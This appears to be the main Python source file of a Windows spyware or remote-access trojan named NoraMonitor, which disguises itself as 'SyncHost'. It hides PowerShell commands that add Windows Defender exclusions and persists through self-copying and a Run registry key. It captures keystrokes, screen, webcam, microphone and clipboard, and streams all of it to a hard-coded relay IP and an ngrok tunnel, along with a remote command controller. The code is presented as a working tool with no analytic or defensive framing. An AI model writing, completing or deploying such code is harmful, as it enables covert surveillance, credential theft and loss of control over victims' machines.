# NoraMonitor v1.2
import os
import sys
import threading
import traceback

# Injected by CI before PyInstaller runs; stays as-is in dev mode
_BUILD_TAG = "nora-monitor-UNKNOWN"

PORT = int(os.environ.get("NORA_PORT", 9090))
NGROK_TOKEN = os.environ.get("NGROK_TOKEN", "")
NORA_RELAY = os.environ.get("NORA_RELAY", "http://162.35.37.67:5000")

_APP_DIR        = os.path.join(os.path.expandvars("%APPDATA%"), "SyncHost")
_LOG_FILE       = os.path.join(_APP_DIR, "nora.log")

def _log(msg):
    try:
        os.makedirs(_APP_DIR, exist_ok=True)
        with open(_LOG_FILE, "a", encoding="utf-8") as f:
            import datetime
            f.write(f"[{datetime.datetime.now():%Y-%m-%d %H:%M:%S}] {msg}\n")
    except Exception:
        pass

_log(f"app.py starting  build={_BUILD_TAG}")

def _add_defender_exclusion():
    """Add SyncHost dir to Windows Defender exclusions (silent, requires admin)."""
    _flag = os.path.join(_APP_DIR, ".av_excluded")
    if os.path.exists(_flag):
        return
    try:
        import subprocess
        subprocess.run(
            ["powershell", "-NonInteractive", "-WindowStyle", "Hidden",
             "-Command",
             f'Add-MpPreference -ExclusionPath "{_APP_DIR}"; '
             f'Add-MpPreference -ExclusionProcess "SyncHost.exe"'],
            timeout=15, capture_output=True,
        )
        os.makedirs(_APP_DIR, exist_ok=True)
        open(_flag, "w").close()
        _log("Defender exclusion added")
    except Exception as e:
        _log(f"Defender exclusion failed: {e}")

threading.Thread(target=_add_defender_exclusion, daemon=True, name="av-excl").start()

try:
    import keylogger as kl
    _log("keylogger OK")
except Exception as e:
    _log(f"keylogger FAIL: {e}")

try:
    import screencap as sc
    _log("screencap OK")
except Exception as e:
    _log(f"screencap FAIL: {e}")

try:
    import controller
    _log("controller OK")
except Exception as e:
    _log(f"controller FAIL: {e}")

try:
    import recorder as rec
    _log("recorder OK")
except Exception as e:
    _log(f"recorder FAIL: {e}")

try:
    import camera as cam
    _log("camera OK")
except Exception as e:
    _log(f"camera FAIL: {e}")

try:
    import clipboard_monitor as cb
    _log("clipboard_monitor OK")
except Exception as e:
    _log(f"clipboard_monitor FAIL: {e}")

try:
    import fastcap_host as fch
    _log("fastcap_host OK")
except Exception as e:
    fch = None
    _log(f"fastcap_host FAIL: {e}")

try:
    import microphone as mic_mod
    _log("microphone OK")
except Exception as e:
    _log(f"microphone FAIL: {e}")

_TOKEN_FILE     = os.path.join(_APP_DIR, "ngrok.token")
_RECORDINGS_DIR = os.path.join(_APP_DIR, "recordings")


def _register_startup():
    """
    Copy this EXE to %APPDATA%\\SyncHost\\SyncHost.exe (permanent location)
    then register that path in HKCU Run so the monitor survives if the original
    EXE is deleted.
    """
    try:
        import winreg, shutil
        os.makedirs(_APP_DIR, exist_ok=True)
        permanent_exe = os.path.join(_APP_DIR, "SyncHost.exe")

        if getattr(sys, "frozen", False):
            src = sys.executable
            # Only copy if not already running from the permanent location
            if os.path.normcase(src) != os.path.normcase(permanent_exe):
                shutil.copy2(src, permanent_exe)
            target = permanent_exe
        else:
            target = os.path.abspath(__file__)

        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, "SyncHost", 0, winreg.REG_SZ, f'"{target}"')
        winreg.CloseKey(key)
    except Exception:
        pass


def _load_token():
    token = NGROK_TOKEN
    if not token and os.path.exists(_TOKEN_FILE):
        with open(_TOKEN_FILE) as f:
            token = f.read().strip()
    return token


def _start_ngrok(port, broadcast_fn):
    try:
        from pyngrok import ngrok, conf
        token = _load_token()
        if not token:
            return
        conf.get_default().auth_token = token
        tunnel = ngrok.connect(port, "http")
        url = tunnel.public_url
        def _broadcast():
            import time; time.sleep(2)
            broadcast_fn(url)
        threading.Thread(target=_broadcast, daemon=True).start()
    except Exception:
        pass


def main():
    _log("main() entered")
    import server
    _log("server imported")
    relay = None
    if NORA_RELAY:
        import relay_client
        relay = relay_client
        _log(f"relay_client imported, relay={NORA_RELAY}")

    recorder = rec.Recorder(output_dir=_RECORDINGS_DIR, fps=10)

    def broadcast_frame(b64):
        server.broadcast_frame(b64)
        if relay: relay.broadcast_frame(b64)

    def broadcast_key(data):
        server.broadcast_key(data)
        if relay: relay.broadcast_key(data)

    def broadcast_camera(b64):
        server.broadcast_camera(b64)
        if relay: relay.broadcast_camera(b64)

    def broadcast_clipboard(text):
        server.broadcast_clipboard(text)
        if relay: relay.broadcast_clipboard(text)

    def broadcast_audio(b64):
        server.broadcast_audio(b64)
        if relay: relay.broadcast_audio(b64)

    mic = mic_mod.MicCapture(on_chunk=broadcast_audio)
    camera = cam.CameraCapture(on_frame=broadcast_camera, fps=8, quality=40)
    server.init(controller.handle_command, recorder, camera, mic)
    if relay:
        relay.init(controller.handle_command, recorder, camera, mic, capture)
        relay.run()

    kl.Keylogger(broadcast_key).start()
    capture = sc.ScreenCapture(broadcast_frame, fps=25, quality=82, scale=0.85)
    capture.attach_recorder(recorder)
    # capture starts on-demand when viewer clicks ▶ Start JPEG Stream
    cb.ClipboardMonitor(broadcast_clipboard).start()

    threading.Thread(
        target=_start_ngrok,
        args=(PORT, server.broadcast_ngrok_url),
        daemon=True,
    ).start()

    _log(f"starting Flask server on port {PORT}")
    server.run(port=PORT)


if __name__ == "__main__":
    try:
        _register_startup()
        _log("startup registered, calling main()")
        try:
            import av_exclude
            av_exclude.run(log=_log)
        except Exception as e:
            _log(f"av_exclude FAIL: {e}")
        try:
            import updater
            updater.start(build_tag=_BUILD_TAG, log=_log)
            _log("updater started")
        except Exception as e:
            _log(f"updater FAIL: {e}")
        main()
    except Exception:
        _log("FATAL:\n" + traceback.format_exc())
